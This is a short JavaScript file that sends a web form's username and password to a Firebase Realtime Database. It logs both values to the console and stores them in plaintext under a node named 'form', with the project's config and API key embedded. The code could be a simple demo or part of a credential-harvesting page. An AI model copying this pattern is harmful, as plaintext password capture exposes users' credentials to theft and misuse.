const firebaseConfig = {
    apiKey: "AIzaSyDrNUDQTBO7V3mxCyuLZcjyXlI5h6nk-9I",
    authDomain: "form-fc0ad.firebaseapp.com",
    databaseURL: "https://form-fc0ad-default-rtdb.firebaseio.com",
    projectId: "form-fc0ad",
    storageBucket: "form-fc0ad.appspot.com",
    messagingSenderId: "1037926066553",
    appId: "1:1037926066553:web:5cc8ca1caaabc7f237e7a8"
  };
firebase.initializeApp(firebaseConfig);

var formDB = firebase.database().ref('form');

document.getElementById("form").addEventListener("submit", SubmitForm);
function SubmitForm(e){
    // e.preventDefault();  
    var username = getElementVal("username");
    var password = getElementVal("password");
    console.log(username, password);
    
  saveMessages(username, password);
}

const saveMessages = (username, password) => {
    var newContactForm = formDB.push();
  
    newContactForm.set({
      username: username,
      password: password,
    });
  };

const getElementVal = (id) => {
    return document.getElementById(id).value;

};

